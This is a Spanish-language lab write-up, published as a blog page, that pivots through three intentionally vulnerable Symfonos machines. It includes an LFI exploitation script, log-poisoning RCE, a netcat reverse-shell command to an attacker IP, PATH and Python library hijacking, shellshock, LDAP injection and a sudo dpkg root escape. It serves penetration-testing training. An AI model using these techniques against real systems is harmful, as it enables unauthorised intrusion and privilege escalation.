@@ -1,0 +1,842 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Laboratorio de Pivoting - Symfonos 1,3,5 - Not Lucken      Ciberseguridad      </title>
+<meta name="description" content="En este post veremos algunas tecnicas de Pivoting entre 3 maquinas.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Not Lucken | Ciberseguridad">
+<meta property="og:title" content="Laboratorio de Pivoting - Symfonos 1,3,5">
+<meta property="og:url" content="http://localhost:4000/Laboratorio-de-Pivoting/">
+
+
+  <meta property="og:description" content="En este post veremos algunas tecnicas de Pivoting entre 3 maquinas.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/labPivoting/Symfonos.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-10-27T00:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/Laboratorio-de-Pivoting/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "notlucken",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Not Lucken | Ciberseguridad Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/videos/" >Vídeos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Laboratorio de Pivoting - Symfonos 1,3,5</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="notlucken" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">notlucken</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Experto Universitario en Hacking Etico
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/notlucken" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Laboratorio de Pivoting - Symfonos 1,3,5">
+    <meta itemprop="description" content="En este post veremos algunas tecnicas de Pivoting entre 3 maquinas.">
+    <meta itemprop="datePublished" content="October 27, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Laboratorio de Pivoting - Symfonos 1,3,5
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-10-27T00:00:00-03:00">October 27, 2022 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/assets/images/labPivoting/Symfonos.png" width="400" />
+<img src="/assets/images/labPivoting/red.png" />
+</p>
+
+<p>Yo me monté una red de 3 máquinas con 2 redes internas, para poder solo tener acceso a Symfonos 1 e ir pivoteando para ganar acceso a la máquina final que sería Symfonos 5.</p>
+
+<h1 id="symfonos-1">Symfonos 1</h1>
+<h2 id="enumeración">Enumeración</h2>
+<p>Comenzamos con la Symfonos 1:</p>
+
+<p><img src="/assets/images/labPivoting/1.png" alt="" /></p>
+
+<p>Ahí vemos que tiene redireccionamiento DNS, a symfonos.local, así que lo agregamos al /etc/hosts.</p>
+
+<p><img src="/assets/images/labPivoting/2.png" alt="" /></p>
+
+<p>Nada raro. Vamos a ver el samba que está corriendo por los puertos 139 y 445.</p>
+
+<p><img src="/assets/images/labPivoting/3.png" alt="" /></p>
+
+<p>Ya sabemos que hay un usuario que se llama helios.</p>
+
+<p><img src="/assets/images/labPivoting/4.png" alt="" /></p>
+
+<p>Probemos estas contraseñas en samba con el usuario helios:</p>
+
+<p><img src="/assets/images/labPivoting/5.png" alt="" /></p>
+
+<p>Vemos algunos archivos, pero el que nos interesa es el todo.txt</p>
+
+<p><img src="/assets/images/labPivoting/6.png" alt="" /></p>
+
+<p>/h3l105, probemos en la página web.</p>
+
+<p><img src="/assets/images/labPivoting/7.png" alt="" /></p>
+
+<h2 id="ganando-acceso-al-sistema">Ganando acceso al Sistema</h2>
+
+<p>Enumeremos con wpscan:</p>
+
+<p><img src="/assets/images/labPivoting/8.png" alt="" /></p>
+
+<p>Chan. Mail Masta, un plugin vulnerable a <a href="https://lab.wallarm.com/what-is-local-file-inclusion-vulnerability/">LFI (Local File Inclusion)</a></p>
+
+<p><img src="/assets/images/labPivoting/9.png" alt="" /></p>
+
+<p>Versión 1.0.0, lo cuál es vulnerable al exploit 40290.txt de searchsploit
+En el exploit nos dice que para leer archivos del servidor mediante Mail Masta, hay que ir a la siguiente ruta: 
+<code class="language-plaintext highlighter-rouge">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send?p/etc/passwd</code></p>
+
+<p><img src="/assets/images/labPivoting/10.png" alt="" /></p>
+
+<p>Con esto, nos podemos montar un script en bash que lea el archivo que le pedimos
+<code class="language-plaintext highlighter-rouge">lfi.sh</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="c">#Gracias S4vitar!</span>
+<span class="k">function </span>ctrl_c<span class="o">(){</span>
+  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!]Saliendo...</span><span class="se">\n</span><span class="s2">"</span>
+  <span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="c"># Ctrl + C</span>
+<span class="nb">trap </span>ctrl_c INT
+
+<span class="nb">declare</span> <span class="nt">-i</span> <span class="nv">parameter_counter</span><span class="o">=</span>0
+
+<span class="k">function </span>fileRead<span class="o">(){</span>
+  <span class="nv">filename</span><span class="o">=</span><span class="nv">$1</span>
+
+  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+] Este es el contenido del archivo </span><span class="nv">$filename</span><span class="s2">:</span><span class="se">\n</span><span class="s2">"</span>
+  curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=</span><span class="nv">$filename</span><span class="s2">"</span>
+<span class="o">}</span>
+<span class="k">function </span>helpPanel<span class="o">(){</span>
+  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[i]Uso</span><span class="se">\n</span><span class="s2">"</span>
+  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">h) Mostrar este panel</span><span class="se">\n</span><span class="s2">"</span>
+  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">f) Proporcionar ruta del archivo a leer</span><span class="se">\n</span><span class="s2">"</span>
+<span class="o">}</span>
+
+<span class="k">while </span><span class="nb">getopts</span> <span class="s2">"hf:"</span> arg<span class="p">;</span> <span class="k">do
+  case</span> <span class="nv">$arg</span> <span class="k">in
+    </span>h<span class="p">)</span> <span class="p">;;</span>
+    f<span class="p">)</span> <span class="nv">filename</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;</span> <span class="nb">let </span>parameter_counter+<span class="o">=</span>1<span class="p">;;</span>
+  <span class="k">esac</span>
+<span class="k">done
+
+if</span> <span class="o">[</span> <span class="nv">$parameter_counter</span> <span class="nt">-eq</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">then
+  </span>fileRead <span class="s2">"</span><span class="nv">$filename</span><span class="s2">"</span>
+<span class="k">else
+  </span>helpPanel
+<span class="k">fi</span>
+</code></pre></div></div>
+<p><img src="/assets/images/labPivoting/12.png" alt="" /></p>
+
+<p>Con esto, sabiendo que tiene Mail Masta y el puerto 25 smtp abierto, podemos hacer lo siguiente:</p>
+
+<p><img src="/assets/images/labPivoting/13.png" alt="" /></p>
+
+<p>Para realizar un <a href="https://www.geeksforgeeks.org/what-is-remote-code-execution-rce/">RCE (Remote Code Execution)</a>, hay que hacer lo siguiente desde telnet:
+<img src="/assets/images/labPivoting/14.png" alt="" /></p>
+
+<p>Entonces ahora, si le hacemos un <code class="language-plaintext highlighter-rouge">curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios"</code></p>
+
+<p><img src="/assets/images/labPivoting/15.png" alt="" /></p>
+
+<p>Llegó nuestro mail con código malicioso! Ahora para saber si funcionó, hay que sumarle al final de la lína del curl un &amp;cmd=whoami:</p>
+
+<p><img src="/assets/images/labPivoting/16.png" alt="" /></p>
+
+<p>Ahora, para ganar una reverse shell, hay que introducir el comando nc -e /bin/sh 192.168.100.104 1234</p>
+
+<p><img src="/assets/images/labPivoting/17.png" alt="" /></p>
+
+<p>Ganamos acceso al servidor! ahora hay que hacer un <a href="/Tratamiento-de-la-TTY/">Tratamiento de la TTY</a></p>
+
+<h2 id="escalada-de-privilegios-vertical">Escalada de privilegios Vertical</h2>
+
+<p>Ahora para la escalada de privilegios, buscamos binarios SUID:</p>
+
+<p><img src="/assets/images/labPivoting/18.png" alt="" /></p>
+
+<p>Vemos uno raro, el /opt/statuscheck
+Si lo ejecutamos:</p>
+
+<p><img src="/assets/images/labPivoting/19.png" alt="" /></p>
+
+<p>Obviamente como es un binario y encima el dueño es root, no lo podremos ver, pero lo que podemos hacer es pasarlo a nuestra máquina con el web server de python, para luego mirarlo con el comando strings</p>
+
+<p><img src="/assets/images/labPivoting/20.png" alt="" /></p>
+
+<p>Usa el comando curl, así que para escalara privilegios podríamos hacer un PATH Hijacking y poner a hacer de curl el comando que nosotros quieramos.</p>
+
+<p><img src="/assets/images/labPivoting/21.png" alt="" /></p>
+
+<p>En el ejecutable curl, pusimos chmod u+s /bin/bash, lo que nos asignaría permisos de superusuario a nuestra bash, y luego hicimos que el PATH lea primero los archivos que están en la ruta actual de trabajo, para que al ejecutar el /opt/statuscheck lea primero nuestro curl malicioso.</p>
+
+<p><img src="/assets/images/labPivoting/22.png" alt="" /></p>
+
+<p>Escalamos privilegios!
+Ahora la parte de Pivoting.</p>
+
+<h1 id="pivoting-a-symfonos-3">Pivoting a Symfonos 3</h1>
+
+<p>subimos los binarios <code class="language-plaintext highlighter-rouge">hostDiscovery.sh</code> y <code class="language-plaintext highlighter-rouge">portDiscovery.sh</code> para descubrir hosts desde la primera máquina y luego los puertos abiertos.
+Son de fácil uso, y también de fácil edición.
+<code class="language-plaintext highlighter-rouge">portDiscovery.sh</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="c">#Gracias S4vitar!</span>
+<span class="k">function </span>ctrl_c<span class="o">(){</span>
+  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo..."</span>
+  <span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="c">#Ctrl+C </span>
+<span class="nb">trap </span>ctrl_c INT
+
+<span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 65535<span class="si">)</span><span class="p">;</span> <span class="k">do
+  </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/10.10.0.128/</span><span class="nv">$port</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] 10.10.0.128 - PORT </span><span class="nv">$port</span><span class="s2"> OPEN"</span>&amp;
+<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">hostDiscovery.sh</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="c">#Gracias S4vitar!</span>
+<span class="c">#Colours</span>
+<span class="nv">greenColour</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;32m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">endColour</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[0m</span><span class="se">\e</span><span class="s2">[0m"</span>
+<span class="nv">redColour</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;31m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">blueColour</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;34m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">yellowColour</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;33m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">purpleColour</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;35m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">turquoiseColour</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;36m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">grayColour</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;37m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+
+<span class="c">#Si no hay parámetros, suponemos funcionamiento para HTP IP: 10.10.10.X</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+    for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>2 254<span class="si">)</span><span class="p">;</span> <span class="k">do
+        </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"sudo ping -c 1 10.10.10.</span><span class="nv">$i</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">blueColour</span><span class="k">}</span><span class="s2">Host 10.10.10.</span><span class="nv">$i</span><span class="k">${</span><span class="nv">endColour</span><span class="k">}</span><span class="s2"> </span><span class="se">\t</span><span class="s2"> - </span><span class="k">${</span><span class="nv">greenColour</span><span class="k">}</span><span class="s2">ACTIVE</span><span class="k">${</span><span class="nv">endColour</span><span class="k">}</span><span class="s2">"</span> &amp;
+    <span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
+    
+<span class="c">#Si hay parámetros, tratamos cada uno de los parámetros como una de las 3 primeras partes de la IP: 192 168 0 X</span>
+<span class="k">else 
+    for </span>j <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>2 254<span class="si">)</span><span class="p">;</span> <span class="k">do
+        </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"sudo ping -c 1 </span><span class="nv">$1</span><span class="s2">.</span><span class="nv">$2</span><span class="s2">.</span><span class="nv">$3</span><span class="s2">.</span><span class="nv">$j</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">blueColour</span><span class="k">}</span><span class="s2">Host </span><span class="nv">$1</span><span class="s2">.</span><span class="nv">$2</span><span class="s2">.</span><span class="nv">$3</span><span class="s2">.</span><span class="nv">$j</span><span class="k">${</span><span class="nv">endColour</span><span class="k">}</span><span class="s2"> </span><span class="se">\t</span><span class="s2"> - </span><span class="k">${</span><span class="nv">greenColour</span><span class="k">}</span><span class="s2">ACTIVE</span><span class="k">${</span><span class="nv">endColour</span><span class="k">}</span><span class="s2">"</span> &amp;
+    <span class="k">done</span><span class="p">;</span> <span class="nb">wait
+</span><span class="k">fi</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/labPivoting/23.png" alt="" /></p>
+
+<p>El script de hostDiscovery.sh nos detectó un host distinto al de la primera máquina, y ahora veremos los puertos abiertos:</p>
+
+<p><img src="/assets/images/labPivoting/25.png" alt="" /></p>
+
+<p>Bien, ahora para hacer un escaneo más exhaustivo hay que tirar de Nmap desde nuestra máquina, pero como incialmente nosotros no tenemos conexión directa con la segunda máquina, hay que usar chisel.
+Nos bajamos el binario portable de chisel, para luego usar el comando upx para bajarle el peso así lo podamos pasar más rápido.</p>
+
+<p><img src="/assets/images/labPivoting/26.png" alt="" /></p>
+
+<p>Ahora lo subimos con el web server de Python o como vos prefieras, y luego en la máquina vulnerada lo ejecutas de la siguiente manera:</p>
+
+<p><img src="/assets/images/labPivoting/27.png" alt="" /></p>
+
+<p>Y en tu máquina así:</p>
+
+<p><img src="/assets/images/labPivoting/28.png" alt="" /></p>
+
+<p>Pero para que funcione hay que editar el /etc/proxychains.conf de nuestra máquina atacante:</p>
+
+<p><img src="/assets/images/labPivoting/29.png" alt="" /></p>
+
+<p>Tienen que comentar el de socks4, porque si no va a dar problemas.
+Ahora, para probar si tenemos conexión, lanzaremos el comando <code class="language-plaintext highlighter-rouge">proxychains nmap -p80 --open -sT -T5 -v -n 10.10.0.136 2&gt;/dev/null</code></p>
+
+<p><img src="/assets/images/labPivoting/30.png" alt="" /></p>
+
+<p>Tenemos conexión!</p>
+
+<h2 id="enumeración-de-symfonos-3">Enumeración de Symfonos 3</h2>
+
+<p>Ahora hay que proceder como en un escaneo normal, no olvidandonos de usar proxychains al inicio de cada comando.
+ Yo suelo usar este:</p>
+
+<p><img src="/assets/images/labPivoting/31.png" alt="" /></p>
+
+<p>Al querer escanear las versiones de los puertos en cuestión proxychains nos dará algunos errores, pero nada de qué preocuparse.</p>
+
+<p><img src="/assets/images/labPivoting/32.png" alt="" /></p>
+
+<p>Ahora, si queremos ver la web, obviamente no llegaremos, pero para eso hay que tirar de FoxyProxy.</p>
+
+<p><img src="/assets/images/labPivoting/33.png" alt="" /></p>
+
+<p>Así, vamos a poder llegar a la web.</p>
+
+<p><img src="/assets/images/labPivoting/34.png" alt="" /></p>
+
+<p>Si vemos el código fuente:</p>
+
+<p><img src="/assets/images/labPivoting/35.png" alt="" /></p>
+
+<p>Habla algo de underworld. Vamos a tirar de gobuster para ver si encontramos algo.
+<img src="/assets/images/labPivoting/37.png" alt="" /></p>
+
+<p>Importante saber que para declarar el proxy en el gobuster no hace falta usar proxychains, solo con usar el parámetro <code class="language-plaintext highlighter-rouge">--proxy socks5://127.0.0.1:1080</code> ya estaría.</p>
+
+<p>Descubri el directorio /cgi-bin/ (Gracias a la opcion <code class="language-plaintext highlighter-rouge">--add-slash</code>) pero es Forbidden. Iba a volver a fuzzear pero me acorde de lo que hablaba de underworld:</p>
+
+<h2 id="ganando-acceso-al-sistema-1">Ganando Acceso al Sistema</h2>
+
+<p><img src="/assets/images/labPivoting/38.png" alt="" /></p>
+
+<p>Tenemos algo!
+parece como si fuera algun comando de consola tipo uptime, y esto me hace acordar a una vulnerabilidad que era muy explotada en 2014, shellshock. Probemos si es vulnerable.
+Usaré el exploit 34766.php de searchsploit.</p>
+
+<p>Y ahora para probar, me voy a mandar una shell desde Symfonos 3 a mi máquina, pero no sin 
+antes reenviar por TCP todo el tráfico entrante por el puerto 4646 de la Symfonos 1 a mi máquina mediante socat:</p>
+
+<p><img src="/assets/images/labPivoting/39.png" alt="" /></p>
+
+<p>Entonces ahora tenemos que mandar el shellshock de la Symfonos 3 a la Symfonos 1, PERO nosotros tenemos que estar en escucha por el puerto 4646 en NUESTRA máquina, ya que eestamos desviando todo el trafico entrante de Symfonos 1 a nosotros.</p>
+
+<p><img src="/assets/images/labPivoting/40.png" alt="" /></p>
+
+<p>Y llegamos a Symfonos 3!</p>
+
+<p><img src="/assets/images/labPivoting/41.png" alt="" /></p>
+
+<h2 id="escalada-de-privilegios-horizontal">Escalada de Privilegios Horizontal</h2>
+<p>Si listamos /home, nos encontramos que hay otro usuario aparte de cerberus, hades.
+Subí el binario de <a href="https://github.com/DominicBreuker/pspy">pspy</a> a la Symfonos 3, para listar los procesos que hay en background, y esto fue lo que vi:</p>
+
+<p><img src="/assets/images/labPivoting/42.png" alt="" /></p>
+
+<p>Qué será eso?
+Vamos a ver.</p>
+
+<p><img src="/assets/images/labPivoting/43.png" alt="" /></p>
+
+<p>Mmmm denegado.</p>
+
+<p><img src="/assets/images/labPivoting/44.png" alt="" /></p>
+
+<p>Y el dueño es hades. Creo que por acá tenemos nuestra escalada de privilegios horizontal.
+Ese script le está mandando datos a FTP, y como FTP es un protocolo de datos en plano(sin encriptar) podríamos interceptarlo con tcpdump.</p>
+
+<p>El comando que use: <code class="language-plaintext highlighter-rouge">tcpdump -w ftp.pcap -i ens33.</code>
+Pero esto no funcionó. Estaba todo encriptado.
+Recorde que estaba enviando todo a traves de la interfaz lo, lo cual me hizo pensar que lo estaba enviando en local, asi que la voy a escanear a esa
+Ahora probaré con la interfaz <code class="language-plaintext highlighter-rouge">lo</code>.</p>
+
+<p>Para pasarnos un archivo de la Symfonos 3 a nuestra máquina (Acordate que no tenemos conexión directa) Tenemos que pasarlo de máquina en máquina mediante el servidor web de Python.</p>
+
+<p><img src="/assets/images/labPivoting/45.png" alt="" /></p>
+
+<p>Y tenemos las credenciales de Hades.
+Bien, ahora ya logeados como hades, procedemos a la escala de privilegios vertical.</p>
+<h2 id="escalada-de-privilegios-vertical-1">Escalada de Privilegios Vertical</h2>
+
+<p>En los binario SUID no hay nada interesante, pero me acordé de la carpeta ftpclient que no podíamos acceder en /opt</p>
+
+<p><img src="/assets/images/labPivoting/46.png" alt="" /></p>
+
+<p>Como a este binario lo está corriendo Root y no lo podemos modificar, pero sí leer, podríamos fijarnos en alguna librería que esté usando para poder inyectar nuestros comandos ahí.</p>
+
+<p><img src="/assets/images/labPivoting/47.png" alt="" /></p>
+
+<p>Está usando ftplib, así que vamos a buscarla en /usr/lib/python2.7/ftplib.py</p>
+
+<p>hacemos nuestro Library Hijacking:</p>
+
+<p><img src="/assets/images/labPivoting/49.png" alt="" /></p>
+
+<p>Si esperamos que root ejecute el binario:</p>
+
+<p><img src="/assets/images/labPivoting/50.png" alt="" />
+Y ya escalamos la segunda máquina!</p>
+<h1 id="pivoting-a-symfonos-5">Pivoting a Symfonos 5</h1>
+
+<p>con hostDiscovery, encontramos otra IP diferente a la nuestra.</p>
+
+<p><img src="/assets/images/labPivoting/51.png" alt="" /></p>
+
+<p>Ahora, para hacer un Dynamic Port Forwarding desde la Symfonos 3 (que da cara a la Symfonos 5) hasta nuestra máquina, hay que hacer lo siguiente con chisel:</p>
+
+<p><img src="/assets/images/labPivoting/52.png" alt="" /></p>
+
+<p>Esto desde la Symfonos 3 intentará conectarse a la Symfonos 1:</p>
+
+<p><img src="/assets/images/labPivoting/53.png" alt="" /></p>
+
+<p>Así que desde la Symfonos 1 hay que redigir todo el tráfico con socat a nuestra máquina atacante.
+pero para que funcione hay que tocar ciertos parametros del proxychains.conf</p>
+
+<p><img src="/assets/images/labPivoting/54.png" alt="" /></p>
+
+<p><img src="/assets/images/labPivoting/55.png" alt="" /></p>
+
+<p>y si tiramos de nmap para ver si el puerto 80 de la Symfonos 5 está abierto:</p>
+
+<p><img src="/assets/images/labPivoting/56.png" alt="" /></p>
+
+<p>Tenemos conexion!</p>
+
+<h2 id="enumeración-symfonos-5">Enumeración Symfonos 5</h2>
+<p><img src="/assets/images/labPivoting/57.png" alt="" /></p>
+
+<p>Vamos a ver la web, acordandonos que hay que usar el FoxyProxy con el puerto 8888.</p>
+
+<p><img src="/assets/images/labPivoting/58.png" alt="" /></p>
+
+<p>Hora de usar el gobuster.</p>
+
+<p><img src="/assets/images/labPivoting/59.png" alt="" /></p>
+
+<p>Creo que con esto nos basta y sobra.
+Vamos a ver qué hay en /admin.php</p>
+
+<p><img src="/assets/images/labPivoting/60.png" alt="" /></p>
+
+<p>Un Login, y me suena que esté conectado al LDAP que vemos en la enumeración.
+Vamos a ver si se puede hacer un LDAP Injection</p>
+
+<p><img src="/assets/images/labPivoting/61.png" alt="" /></p>
+
+<p>Voy a probar con * de usuario y * de contraseña</p>
+
+<p>Y podemos acceder, y si nos vamos a la parte de portraits vemos esto:</p>
+
+<p><img src="/assets/images/labPivoting/62.png" alt="" /></p>
+
+<p>Por la estructrura de la web, me suea a que podemos leer algun archivo interno:</p>
+
+<p><img src="/assets/images/labPivoting/63.png" alt="" /></p>
+
+<p>Bum.
+Ahora para ver el admin.php por dentro, habria que pasarlo a base64 y despues decodificarlo, tal que asi:</p>
+
+<p><img src="/assets/images/labPivoting/64.png" alt="" /></p>
+
+<p><img src="/assets/images/labPivoting/65.png" alt="" /></p>
+
+<p>Ahora si le echamos un ojo:</p>
+
+<p><img src="/assets/images/labPivoting/66.png" alt="" /></p>
+
+<p>tenemos algunas credenciales de LDAP.
+si usamos nmap con el script de ldap-search:</p>
+
+<p><img src="/assets/images/labPivoting/67.png" alt="" /></p>
+
+<p><img src="/assets/images/labPivoting/68.png" alt="" /></p>
+
+<p>Tenemos la contraseña de zeus!
+Ahora nos conectaremos por SSH:</p>
+
+<p><img src="/assets/images/labPivoting/69.png" alt="" /></p>
+
+<p>Estamos adentro de la 3ra máquina! 
+Solo nos queda escalar privilegios.</p>
+<h2 id="escalada-de-privilegios-de-symfonos-5">Escalada de Privilegios de Symfonos 5</h2>
+
+<p>En los binarios SUID no encontramos nada, pero al hacer un sudo -l nos encontramos esto:
+<img src="/assets/images/labPivoting/70.png" alt="" /></p>
+
+<p>Si nos vamos a gtfobins, nos encontraremos que con dpkg podemos spawnear una consola como root de la siguiente manera
+<code class="language-plaintext highlighter-rouge">sudo dpkg -l
+!/bin/sh</code></p>
+
+<p><img src="/assets/images/labPivoting/71.png" alt="" /></p>
+
+<p><img src="/assets/images/labPivoting/72.png" alt="" /></p>
+
+<p>Esta es nuestra flag final!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#bash" class="page__taxonomy-item" rel="tag">Bash</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#herramientas" class="page__taxonomy-item" rel="tag">Herramientas</a><span class="sep">, </span>
+    
+      
+      
